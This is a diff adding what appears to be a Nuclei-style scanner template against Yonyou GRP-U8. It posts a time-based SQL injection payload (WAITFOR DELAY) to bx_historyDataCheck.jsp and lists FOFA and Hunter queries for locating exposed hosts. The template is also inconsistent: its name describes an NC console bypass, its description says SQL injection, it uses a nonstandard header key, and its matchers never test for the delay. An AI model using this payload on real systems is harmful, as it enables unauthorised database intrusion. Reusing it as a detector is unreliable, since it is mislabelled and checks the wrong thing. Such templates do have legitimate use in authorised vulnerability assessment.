@@ -1,0 +1,36 @@
+id: youyong-GRP8-bx_history_sql
+time: '2023-09-20'
+
+
+info:
+  name: 用友nc 控制台绕过漏洞
+  severity: high
+  description: 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞
+  reference: https://blog.csdn.net/qq_56698744/article/details/133310341
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="yonyou-GRP-U8"
+    Hunter: web.body="uap/rbac"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/u8qx/bx_historyDataCheck.jsp" 
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded   
+    body: 
+      - "userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag="
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0"
+
+      - type: status
+        status:
+          - 200
